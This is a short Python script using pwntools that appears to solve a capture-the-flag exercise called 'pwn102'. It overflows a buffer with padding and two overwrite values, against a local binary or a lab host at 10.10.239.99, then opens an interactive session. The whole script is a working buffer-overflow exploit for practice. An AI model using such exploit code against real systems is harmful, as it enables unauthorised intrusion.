#!/usr/bin/python3

from pwn import *

test = cyclic(128, n=4)
coffee_offset = cyclic_find(0x62616163, n=4)
code_offset = cyclic_find(0x62616162, n=4)

local = True
filename = './pwn102.pwn102'
hostname = '10.10.239.99'
port = 9002

if local:
    p = process(filename)
else:
    p = remote(hostname, port)

payload = b"A" * code_offset
payload += p32(0xc0d3)
payload += p32(0xc0ff33)

p.sendline(payload)
p.interactive()



